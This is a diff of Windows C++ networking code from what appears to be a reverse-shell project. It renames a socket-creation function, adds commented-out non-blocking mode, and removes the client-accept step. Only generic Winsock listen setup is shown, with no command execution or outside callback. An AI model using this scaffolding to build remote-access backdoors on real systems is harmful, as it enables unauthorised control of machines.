@@ -2,7 +2,8 @@
 #include <windows.h>
 #include <iostream>
 
-#include "reverseShell.h"
+#include "reverse-shell.h"
+
 
 extern reverseShell_t	shell;
 extern BOOL				g_stopProcess;
@@ -31,13 +32,15 @@ static BYTE initWinSockDll(void) {
 	return (SUCCESS);
 }
 
-static BYTE createSocket(void) {
+static BYTE createListenSocket(void) {
 	if (getAddr() == FAILURE)
 		return (FAILURE);
 	
 	shell.listenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
 	if (shell.listenSocket == INVALID_SOCKET)
 		return (FAILURE);
+	//u_long mode = 1;
+	//ioctlsocket(shell.listenSocket, FIONBIO, &mode);
 	return (SUCCESS);
 }
 
@@ -63,29 +66,16 @@ static BYTE listenSocket(void) {
 	return (SUCCESS);
 }
 
-static BYTE acceptClient(void) {
-	if (processShouldStop() == TRUE)
-		return (FAILURE);
-	shell.clientSocket = accept(shell.listenSocket, NULL, NULL);
-	journalReport(L"Accepted client\n");
-
-	if (shell.clientSocket == INVALID_SOCKET) {
-		journalReport(L"Invalid client socket \n");
-		return (FAILURE);
-	}
-	return (SUCCESS);
-}
-
 BYTE initNetworking(void) {
 	if (initWinSockDll() == FAILURE) return (FAILURE);
 
-	if (createSocket() == FAILURE) return (FAILURE);
+	if (createListenSocket() == FAILURE) return (FAILURE);
 
 	if (bindSocket() == FAILURE) return (FAILURE);
 
 	if (listenSocket() == FAILURE) return (FAILURE);
 
-	if (acceptClient() == FAILURE) return (FAILURE);
+	//if (acceptClient() == FAILURE) return (FAILURE); // Why not in a thread instead of stopping everything ?
 
 	return (SUCCESS);
 }
